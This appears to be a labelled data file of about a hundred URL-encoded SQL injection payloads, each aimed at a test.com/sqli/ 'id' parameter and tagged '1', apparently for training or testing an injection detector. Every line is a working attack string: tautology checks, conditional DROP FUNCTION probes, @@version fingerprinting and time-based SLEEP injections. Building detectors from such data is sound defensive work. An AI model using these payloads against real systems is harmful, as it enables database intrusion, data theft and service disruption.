test.com/sqli/?id=OR+%271%27%3D+AND+%28%27KtyB%27+LIKE+%27%27KtyB%27%27&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%27%3D+AND+%28%27KtyB%27+LIKE+%27%27KtyB%27&Submit=Submit#,1
test.com/sqli/?id=OR+39%3D39+AND+%28%27kdcR%27+LIKE+kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+39%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+1%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D39+AND+%28%27kdcR%27+LIKE+kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D39+AND+%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%27%3D39+AND+%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%27%27%3D39+AND+%28%27kdcR%27+LIKE+%27kdcR&Submit=Submit#,1
test.com/sqli/?id=OR+240%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+210%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+400%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+410%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+420%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+450%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+460%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+470%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+480%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+490%3D120+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+500%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+500%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+510%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+520%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+530%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+540%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+550%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+560%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+570%3D800+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=OR+500%3D7400+AND+%28%27pytW%27+LIKE+%27pytY&Submit=Submit#,1
test.com/sqli/?id=AND+1%3D1+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27+AND+%27%25%3D&Submit=Submit#,1
test.com/sqli/?id=AND+1%3D1%27+AND+%27%25%3D&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1+AND+%27%25%3D&Submit=Submit#,1
test.com/sqli/?id=AND+%27%271%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27+AND+%27%25%%27%27%3D%27%27&Submit=Submit#,1
test.com/sqli/?id=AND+%271%3D1%27%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+55%3D55+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+1%3D1+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D1+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D%271%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%27%3D%271%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%271%3D%271+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+1%27%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=OR+%27%271%27%3D1%27+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+605%3D305+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+60%3D60+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+20%3D20+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+30%3D30+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+70%3D70+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+80%3D80+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+90%3D90+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+100%3D100+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+110%3D110+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+120%3D120+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+1%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+1%3D0%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+1%3D0--%27%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+1%3D1--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%271%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%27%271%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%271%27%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%27%271%27%27%3D0--%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%27%271%27%27%3D0--%27%27&Submit=Submit#,1
test.com/sqli/?id=+AS+INJECTX+WHERE+1%3D1+AND+%27%271%27%27%3D1--%27&Submit=Submit#,1
test.com/sqli/?id=AS+INJECTX+WHERE+1%3D1+AND+1%3D1%27&Submit=Submit#,1
test.com/sqli/?id=AS+INJECTX+WHERE+1%3D1+AND+1%3D1%23%27&Submit=Submit#,1
test.com/sqli/?id=IF%287423%3D7424%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%281%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%281%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl%27&Submit=Submit#,1
test.com/sqli/?id=IF%281%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D1%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D%271%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D%271%27%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D%271%27%29+SELECT+7423+ELSE+DROP+FUNCTION&Submit=Submit#,1
test.com/sqli/?id=IF%28%271%27%3D%271%27%29+SELECT+7423+ELSE+DROP+FUNCTION+xclt&Submit=Submit#,1
test.com/sqli/?id=IF%287423%3D7423%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2823%3D23%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%284%3D4%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2870%3D70%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2850%3D50%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xcjl--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xctk--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xcfk--%27&Submit=Submit#,1
test.com/sqli/?id=IF%2874%3D74%29+SELECT+7423+ELSE+DROP+FUNCTION+xcsk--%27&Submit=Submit#,1
test.com/sqli/?id=and+%28select+substring%28%40%40version%2C1%2C1%29%29%3D%27X%27&Submit=Submit#,1
test.com/sqli/?id=and+%28select+substring%28%40%40version%2C1%2C1%29%29%3D%27M%27&Submit=Submit#,1
test.com/sqli/?id=AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29bAKL%29+AND+%27vRxe%27%3D%27vRxe&Submit=Submit#,1
test.com/sqli/?id=AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29YjoC%29+AND+%27%25%27%3D%27&Submit=Submit#,1
test.com/sqli/?id=AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29--%27&Submit=Submit#,1
test.com/sqli/?id=AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29%23%27&Submit=Submit#,1
test.com/sqli/?id=%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29--%27&Submit=Submit#,1
test.com/sqli/?id=%28SELECT+*+FROM+%28SELECT%28SLEEP%28750%29%29%29ecMj%29--%27&Submit=Submit#,1
